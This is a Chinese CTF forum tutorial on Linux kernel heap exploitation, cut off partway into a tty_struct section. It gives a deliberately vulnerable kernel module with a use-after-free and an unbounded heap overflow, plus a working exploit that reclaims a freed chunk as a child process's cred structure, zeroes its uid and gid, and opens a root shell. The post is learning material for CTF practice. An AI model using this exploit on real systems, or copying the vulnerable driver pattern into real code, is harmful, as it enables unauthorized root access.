---
title: PWN-kernel-堆（UAF heap_overflow freelist劫持 offbynull arbitary_heap_free unlink page_level ）
url: https://forum.butian.net/share/3738
source: 奇安信攻防社区
date: 2024-09-19
fetch_date: 2025-10-06T18:25:02.387840
---

# PWN-kernel-堆（UAF heap_overflow freelist劫持 offbynull arbitary_heap_free unlink page_level ）

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### PWN-kernel-堆（UAF heap\_overflow freelist劫持 offbynull arbitary\_heap\_free unlink page\_level ）

* [CTF](https://forum.butian.net/topic/52)

关于内核相关堆的手法

参考
==
<https://blog.wingszeng.top/kernel-pwn-syscall-userfaultfd-and-syscall-setxattr/>
[https://blog.csdn.net/qq\\_45323960/article/details/130660417?ops\\_request\\_misc=%257B%2522request%255Fid%2522%253A%2522171982506416800211525431%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request\\_id=171982506416800211525431&amp;biz\\_id=0&amp;utm\\_medium=distribute.pc\\_search\\_result.none-task-blog-2~blog~first\\_rank\\_ecpm\\_v1~rank\\_v31\\_ecpm-2-130660417-null-null.nonecase&amp;utm\\_term=kernel&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq\_45323960/article/details/130660417?ops\_request\_misc=%257B%2522request%255Fid%2522%253A%2522171982506416800211525431%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request\_id=171982506416800211525431&biz\_id=0&utm\_medium=distribute.pc\_search\_result.none-task-blog-2~blog~first\_rank\_ecpm\_v1~rank\_v31\_ecpm-2-130660417-null-null.nonecase&utm\_term=kernel&spm=1018.2226.3001.4450)
Use After Free
==============
例题 `heap bof`
开了kaslr，smep,+smap
cred 结构体大小为 0xa8 ，根据 slub 分配机制，如果申请和释放大小为 0xa8（实际为 0xe0 ）的内存块，此时再开一个线程，则该线程的 cred 结构题正是刚才释放掉的内存块。利用 UAF 漏洞就 修改 cred 就可以实现提权。
但新版本的cred\\_jar 不会与其他相同大小的 slab 合并，释放的 cred 结构体只会被放回到 cred\\_jar 中，而不是合并到其他 slab 中。
因为 cred\\_jar 在创建时设置了 SLAB\\_ACCOUNT 标记，在 CONFIG\\_MEMCG\\_KMEM=y 时（默认开启）cred\\_jar 不会再与相同大小的 kmalloc-192 进行合并（可以理解为cred\\_jar 需要单独跟踪其内存使用情况，所以不让与其它们slab合并）
给了源码
```c
#include <asm/uaccess.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/types.h>
struct class \*bof\_class;
struct cdev cdev;
int bof\_major = 256;
char \*ptr[40];// 指针数组，用于存放分配的指针
struct param {
size\_t len; // 内容长度
char \*buf; // 用户态缓冲区地址
unsigned long idx;// 表示 ptr 数组的 索引
};
long bof\_ioctl(struct file \*filp, unsigned int cmd, unsigned long arg) {
struct param p\_arg;
copy\_from\_user(&p\_arg, (void \*) arg, sizeof(struct param));
long retval = 0;
switch (cmd) {
case 9:
copy\_to\_user(p\_arg.buf, ptr[p\_arg.idx], p\_arg.len);
printk("copy\_to\_user: 0x%lx\n", \*(long \*) ptr[p\_arg.idx]);
break;
case 8:
copy\_from\_user(ptr[p\_arg.idx], p\_arg.buf, p\_arg.len);
break;
case 7:
kfree(ptr[p\_arg.idx]);
printk("free: 0x%p\n", ptr[p\_arg.idx]);
break;
case 5:
ptr[p\_arg.idx] = kmalloc(p\_arg.len, GFP\_KERNEL);
printk("alloc: 0x%p, size: %2lx\n", ptr[p\_arg.idx], p\_arg.len);
break;
default:
retval = -1;
break;
}
return retval;
}
static const struct file\_operations bof\_fops = {
.owner = THIS\_MODULE,
.unlocked\_ioctl = bof\_ioctl,//linux 2.6.36内核之后unlocked\_ioctl取代ioctl
};
static int bof\_init(void) {
//设备号
dev\_t devno = MKDEV(bof\_major, 0);
int result;
if (bof\_major)//静态分配设备号
result = register\_chrdev\_region(devno, 1, "bof");
else {//动态分配设备号
result = alloc\_chrdev\_region(&devno, 0, 1, "bof");
bof\_major = MAJOR(devno);
}
printk("bof\_major /dev/bof: %d\n", bof\_major);
if (result < 0) return result;
bof\_class = class\_create(THIS\_MODULE, "bof");
device\_create(bof\_class, NULL, devno, NULL, "bof");
cdev\_init(&cdev, &bof\_fops);
cdev.owner = THIS\_MODULE;
cdev\_add(&cdev, devno, 1);
return 0;
}
static void bof\_exit(void) {
cdev\_del(&cdev);
device\_destroy(bof\_class, MKDEV(bof\_major, 0));
class\_destroy(bof\_class);
unregister\_chrdev\_region(MKDEV(bof\_major, 0), 1);
printk("bof exit success\n");
}
MODULE\_AUTHOR("exp\_ttt");
MODULE\_LICENSE("GPL");
module\_init(bof\_init);
module\_exit(bof\_exit);
```
会根据p\\_arg.idx来选择chunk的i，kfree后没有清零，所以可以再次通过case 9和case 8使用，如果被其他申请后存了和内核地址相关的地址，那么通过 case 9: copy\\_to\\_user就能将内核地址拷贝到用户，从而泄露内核地址。并且由于case 8没有长度限制，由用户的输入决定。所以存在堆溢出
绑核
--
注意由于开启`-smp cores=2,threads=2 \`导致CPU切换进而导致kmalloc-cache-cpu切换导致重新申请的object可能不是原来刚刚kfree掉的，所以需要绑核，不绑核也有一定几率成功
```c
#define \_\_USE\_GNU
#include <sched.h>
/\* to run the exp on the specific core only \*/
void bind\_cpu(int core)
{
cpu\_set\_t cpu\_set;
CPU\_ZERO(&cpu\_set);
CPU\_SET(core, &cpu\_set);
sched\_setaffinity(getpid(), sizeof(cpu\_set), &cpu\_set);
}
bind\_cpu(sched\_getcpu());
```
cred\\_jar 可合并
-------------
此时cred的chunk和一样大小的chunk没有区分，可以从刚被free的相同大小的chunk申请到cred
所以free一个和cred大小一样的堆，然后再创建一个子线程，此时子线程的cred就是刚被free的chunk，然后case：8 修改之前被free的chunk来修改Cred结构体，将其uid和gid改为0
```c
4.5 kernel/cred.c
void \_\_init cred\_init(void)
{
/\* allocate a slab in which we can store credentials \*/
cred\_jar = kmem\_cache\_create("cred\_jar", sizeof(struct cred), 0,
SLAB\_HWCACHE\_ALIGN|SLAB\_PANIC|SLAB\_ACCOUNT, NULL);
}
本题（4.4.72）：
void \_\_init cred\_init(void)
{
/\* allocate a slab in which we can store credentials \*/
cred\_jar = kmem\_cache\_create("cred\_jar", sizeof(struct cred),
0, SLAB\_HWCACHE\_ALIGN|SLAB\_PANIC, NULL);
}
```
### exp
> struct param\*p\\_arg;这里用户态定义的不可以，因为内核中`copy\\_from\\_user(&amp;p\\_arg, (void\* ) arg, sizeof(struct param));`会根据传入的地址拷贝，如果是`struct param\\*p\\_arg`，那么只会传入用户态地址，而`struct param p\\_arg`而传入&amp;p\\_arg将p\\_arg相关变量压入栈
```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/wait.h>
struct param {
size\_t len; // 内容长度
char \*buf; // 用户态缓冲区地址
unsigned long idx;// 表示 ptr 数组的 索引
};
struct param p\_arg;
int main(){
int fd1=open("/dev/bof", O\_RDWR);
p\_arg.len=0xa8;
p\_arg.buf=malloc(0xa8);
p\_arg.idx=0;
ioctl(fd1,5,&p\_arg);
ioctl(fd1,7,&p\_arg);
if(!fork())
{
p\_arg.len=0x28;
p\_arg.buf=malloc(0x28);
p\_arg.idx=0;
memset(p\_arg.buf,0,p\_arg.len);
ioctl(fd1,8,&p\_arg);
if (getuid()==0)
{
puts("[+]root success");
system("/bin/sh");
}
}
else {
wait(NULL);
}
}
```
cred\\_jar 不可合并
--------------
### 利用 tty\\_struct 劫持程序控制流提权
[https://bbs.kanxue.com/thread-270081.htm#msg\\_header\\_h1\\_2](https://bbs.kanxue.com/thread-270081.htm#msg\_header\_h1\_2)
> 结构体 tty\\_struct位于include/linux/tty.h 中，tty\\_operations 位于 include/linux/tty\\_driver.h 中。
在 /dev 下有一个伪终端设备 ptmx ，当 open("/dev/ptmx") 时, 会从 kmalloc-1k 中分配一个 tty\\_struct (0x2b8)，与其他类型设备相同，tty 驱动设备中同样存在着一个存放着函数指针的结构体 tty\\_operations 。
```c
struct tty\_struct {
int magic;
struct kref kref;
struct device \*dev;
struct tty\_driver \*driver;
const struct tty\_operations \*ops;
int index;
/\* Protects ldisc changes: Lock tty not pty \*/
struct ld\_semaphore ldisc\_sem;
struct tty\_ldisc \*ldisc;
struct mutex atomic\_write\_lock;
struct mutex legacy\_mutex;
struct mutex throttle\_mutex;
struct rw\_semaphore termios\_rwsem;
struct mutex winsize\_mutex;
spinlock\_t ctrl\_lock;
spinlock\_t flow\_lock;
/\* Termios values are protected by the termios rwsem \*/
struct ktermios termios, termios\_locked;
struct termiox \*termiox; /\* May be NULL for unsupported \*/
char name[64];
struct pid \*pgrp; /\* Protected by ctrl lock \*/
struct pid \*session;
unsigned long flags;
int count;
struct winsize winsize; /\* winsize\_mutex \*/
unsigned long stopped:1, /\* flow\_lock \*/
flow\_stopped:1,
unused:BITS\_PER\_LONG - 2;
int hw\_stopped;
unsigned long ctrl\_status:8, /\* ctrl\_lock \*/
packet:1,
unused\_ctrl:BITS\_PER\_LONG - 9;
unsigned int receive\_room; /\* Bytes free for queue \*/
int flow\_change;
struct tty\_struct \*link;
struct fasync\_struct \*fasync;
int alt\_spee...